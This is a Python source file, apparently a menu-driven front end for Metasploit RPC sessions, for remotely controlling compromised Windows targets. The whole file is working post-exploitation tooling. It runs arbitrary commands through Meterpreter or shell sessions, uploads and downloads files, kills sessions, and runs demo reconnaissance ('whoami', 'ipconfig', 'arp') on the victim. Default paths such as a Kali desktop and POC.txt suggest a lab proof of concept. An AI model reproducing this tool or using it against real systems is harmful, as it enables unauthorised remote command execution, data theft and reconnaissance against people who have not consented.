import time

from common.util import options, ListSessions


def Runner(app, sid):
    """
    Control targets remotely
    :param app:
    :param sid:
    :return:
    """
    while True:
        opts = {
            "Download": download,
            "Upload": upload,
            "Command": command,
            "Shutdown": shutdown,
            "Demo Meterpreter": demoM,
            "Demo Shell" : demoS,
        }
        sessions = ListSessions(app)
        key = str(sid)


        session_type = sessions[key]["type"]
        session = app.rpc["Client"].sessions.session(key)
        print("Interpreter Type: " + session_type)
        selection = options(opts, "Select", "Select an command")
        if not selection:
            return app
        app = selection(app, session, sid, session_type)


def download(app, session, sid, type):
    """
    Download a file from the target
    :param app:
    :param sid:
    :return:
    """
    file_action(app, session, sid, type, "download")

    return app


def upload(app, session, sid, type):
    """
    Upload a file to the target
    :param app:
    :param sid:
    :return:
    """
    file_action(app, session, sid, type, "upload")

    return app


def command(app, session, sid, type):
    """
    Execute a command on the target
    :param app:
    :param sid:
    :return:
    """
    prefix = '{}({}) {}>  '
    command = input(prefix.format(type, sid, ""))
    result = execute(session, sid, type, command)
    print(result)
    input("Press enter to continue")
    return app



def execute(session, sid, stype, cmd):
    print(f"Executing {cmd} on {stype}({sid})")
    if "Meterpreter" in stype:
        terminating_strs = ['----END----']
        return session.run_with_output(cmd, terminating_strs, timeout=10, timeout_exception=False)
        # 10 seconds max

    elif "Shell" in stype:
        session.write(cmd)
        return session.read()

def shutdown(app, session, sid, type):
    """
    Shutdown the target
    :param app:
    :param sid:
    :return:
    """
    session.write('exit')
    session.stop()
    session.kill()
    input("Press enter to continue")
    return app


def file_action(app, session, sid, type, action):
    """
    Upload or download a file1
    :param app:
    :param sid:
    :param action:
    :return:
    """
    # Remote set as desktop by default
    remote = "C:/Users/user/Desktop"
    local = "/home/kali/Desktop/"

    if action == "upload":
        local += "POC.txt"

    sel = input("Use custom path? (y/n)")
    if sel.lower() == "y":
        remote = input("Remote path: ")
        if action == "download":
            local = input("Local path: ")

    command = action + " " + local + " " + remote
    result = execute(session, sid, type, command)
    print(result)
    input("Press enter to continue")

    return app

def demoM(app, session, sid, type):
    session_command = 'arp'
    terminating_strs = ['----']
    res = session.run_with_output(session_command, terminating_strs)
    print(res)

def demoS(app, session, sid, type):
    shell = session.shell
    shell.write("whoami")
    print(shell.read())
    shell.write("ipconfig")
    print(shell.read())
    input("Press enter to continue")

